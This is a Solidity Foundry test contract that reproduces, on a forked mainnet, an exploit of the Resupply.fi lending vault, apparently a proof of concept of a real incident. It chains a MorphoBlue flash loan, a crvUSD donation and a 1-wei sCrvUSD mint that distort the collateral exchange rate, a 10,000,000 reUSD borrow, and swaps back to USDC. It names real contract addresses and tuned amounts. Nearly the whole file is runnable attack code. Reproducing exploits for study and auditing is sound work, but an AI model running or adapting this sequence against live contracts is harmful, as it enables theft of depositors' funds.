// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.t.sol";


interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
}

interface ICurvePool {
    function exchange(int128, int128, uint256, uint256) external;
}

interface IsCRVUSD {
    function mint(uint256) external;
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function redeem(uint256, address, address) external;
}

interface IResupplyVault {
    function addCollateralVault(uint256, address) external;
    function borrow(uint256, uint256, address) external;
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
}

interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

interface IMorphoBlue {
    function flashLoan(address, uint256, bytes calldata) external;
}

contract ResupplyFi is BaseTestWithBalanceLog {
    // Token Addresses
    IERC20 private constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC stablecoin token.
    IERC20 private constant crvUsd = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E); // crvUSD stablecoin token from Curve.
    IsCRVUSD private constant sCrvUsd = IsCRVUSD(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367); // sCrvUSD token, representing shares in the crvUSD savings vault.
    IERC20 private constant reUsd = IERC20(0x57aB1E0003F623289CD798B1824Be09a793e4Bec); // reUSD token, the borrowable asset in Resupply.fi.
    IWETH private constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // Wrapped Ether token (not used in this exploit simulation).
    // Contract Addresses
    IMorphoBlue private constant morphoBlue = IMorphoBlue(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb); // MorphoBlue lending protocol for flash loans.
    ICurvePool private constant curveUsdcCrvusdPool = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E); // Curve pool for USDC/crvUSD swaps.
    IsCRVUSD private constant sCrvUsdContract = IsCRVUSD(0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D); // Contract for minting/redeeming sCrvUSD shares.
    IResupplyVault private constant resupplyVault = IResupplyVault(0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6); // Vulnerable Resupply.fi vault contract.
    ICurvePool private constant curveReusdPool = ICurvePool(0xc522A6606BBA746d7960404F22a3DB936B6F4F50); // Curve pool for reUSD/sCrvUSD swaps.
    IUniswapV3Pool private constant uniswapV3Pool = IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640); // Uniswap V3 pool (not used in this exploit simulation).
    address private constant crvUSDController = 0x89707721927d7aaeeee513797A8d6cBbD0e08f41; // crvUSD lending controller for the wstUSR market.
    // Exploit Parameters
    uint256 private constant forkBlockNumber = 22_785_460; // Block number to fork for simulation.
    uint256 private constant flashLoanAmount = 4000 * 1e6; // 4,000 USDC (with 6 decimals).
    uint256 private constant crvUsdTransferAmount = 2000 * 1e18; // 2,000 crvUSD donated to controller.
    uint256 private constant sCrvUsdMintAmount = 1; // Tiny deposit (1 wei crvUSD) to mint minimal shares.
    uint256 private constant borrowAmount = 10_000_000 * 1e18; // 10,000,000 reUSD to borrow.
    uint256 private constant redeemAmount = 9_339_517.438774046 ether; // sCrvUSD shares to redeem (obtained from swap).
    uint256 private constant finalExchangeAmount = 9_813_732.715269934 ether; // crvUSD to swap back to USDC.

    receive() external payable {}
    /**
     * @notice Sets up the test environment by forking the mainnet at the specified block.
     * @dev Configures USDC as the funding token for balance logging.
     */

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(usdc);
    }


    function testExploit() public balanceLog {
        
        usdc.approve(address(morphoBlue), type(uint256).max);
        
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }


    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {

        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");

        _swapUsdcForCrvUsd();

        _manipulateOracles();

        _borrowAndSwapReUSD();

        _redeemAndFinalSwap();
    }

  
    function _swapUsdcForCrvUsd() internal {
        
        usdc.approve(address(curveUsdcCrvusdPool), type(uint256).max);
       
        curveUsdcCrvusdPool.exchange(0, 1, flashLoanAmount, 0);
    }


    function _manipulateOracles() internal {

        crvUsd.transfer(crvUSDController, crvUsdTransferAmount);
        
        crvUsd.approve(address(sCrvUsdContract), type(uint256).max);
        
        sCrvUsdContract.mint(sCrvUsdMintAmount);
    }


    function _borrowAndSwapReUSD() internal {
        
        sCrvUsdContract.approve(address(resupplyVault), type(uint256).max);
        
        resupplyVault.addCollateralVault(sCrvUsdMintAmount, address(this));
        
        resupplyVault.borrow(borrowAmount, 0, address(this));
        
        reUsd.approve(address(curveReusdPool), type(uint256).max);
        
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }


    function _redeemAndFinalSwap() internal {
        
        sCrvUsd.redeem(redeemAmount, address(this), address(this));
        
        crvUsd.approve(address(curveUsdcCrvusdPool), type(uint256).max);
        
        curveUsdcCrvusdPool.exchange(1, 0, finalExchangeAmount, 0);
    }
}
